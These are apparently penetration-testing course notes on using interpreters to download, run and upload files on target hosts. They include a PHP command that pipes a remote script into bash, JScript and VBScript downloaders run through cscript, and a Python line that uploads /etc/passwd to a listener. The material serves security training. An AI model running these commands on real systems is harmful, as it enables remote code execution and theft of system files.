# Programming Languages for File Transfer and Execution

## Introduction

Many target systems have various programming languages installed, such as Python, PHP, Perl, Ruby, and JavaScript. These languages can be exploited to download, upload, or execute code remotely, making them valuable tools for attackers and defenders alike.

---

## Windows Native Scripting Tools

- **cscript.exe** and **mshta.exe** can run JavaScript or VBScript directly.
- JavaScript can also run on Linux hosts via Node.js or other engines.

---

## Examples Using Common Programming Languages

### Python

- **Version Compatibility:** Python 2.7 and Python 3.x.
- **Download a file:**

**Python 2:**

```bash
LeDaav@htb[/htb]$ python2.7 -c 'import urllib; urllib.urlretrieve("https://example.com/file.sh", "file.sh")'
```


**Python 3:**

```bash
bash

LeDaav@htb[/htb]$ python3 -c 'import urllib.request; urllib.request.urlretrieve("https://example.com/file.sh", "file.sh")'
```

---

### PHP

- **Prevalence:** Used by over 77% of websites.
- **Download a file with `file_get_contents()` and `file_put_contents()`:**

```bash
bash

LeDaav@htb[/htb]$ php -r '$file = file_get_contents("https://example.com/file.sh"); file_put_contents("file.sh",$file);'
```

- **Download a file with `fopen()`:**

```bash
bash

LeDaav@htb[/htb]$ php -r 'const BUFFER=1024; $fremote=fopen("https://example.com/file.sh","rb"); $flocal=fopen("file.sh","wb"); while($buffer=fread($fremote,BUFFER)){fwrite($flocal,$buffer);} fclose($flocal); fclose($fremote);'
```

- **Pipe content directly to bash:**

```bash
bash

LeDaav@htb[/htb]$ php -r '$lines=@file("https://example.com/file.sh"); foreach($lines as $line){echo $line;}' | bash
```

---

### Ruby

- **Download a file:**

```bash
bash

LeDaav@htb[/htb]$ ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://example.com/file.sh")))' 
```

### Perl

- **Download a file:**

```bash
bash

LeDaav@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://example.com/file.sh", "file.sh");'
```

---

### JavaScript

- Can be used in Windows via **cscript.exe** with a script like `wget.js`:

```javascript
javascript

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
var Stream = new ActiveXObject("ADODB.Stream");
Stream.Type = 1;
Stream.Open();
Stream.Write(WinHttpReq.ResponseBody);
Stream.SaveToFile(WScript.Arguments(1));
```

- Execute with:

```cmd
cmd

C:\htb> cscript.exe /nologo wget.js https://example.com/file.ps1 file.ps1
```

---

### VBScript

- Similar to JavaScript, run via **cscript.exe**:

```vbscript
vbscript

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type=1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

- Run with:

```cmd
cmd

C:\htb> cscript.exe /nologo wget.vbs https://example.com/file.ps1 file.ps1
```

---

## Upload Operations Using Python

### Starting a Python Upload Server

```bash
bash

LeDaav@htb[/htb]$ python3 -m uploadserver
```

- Accessible at `/upload`.

### Upload a File with Python One-liner

```python
python

import requests
requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd", "rb")})
```

- This uploads `/etc/passwd` to the server.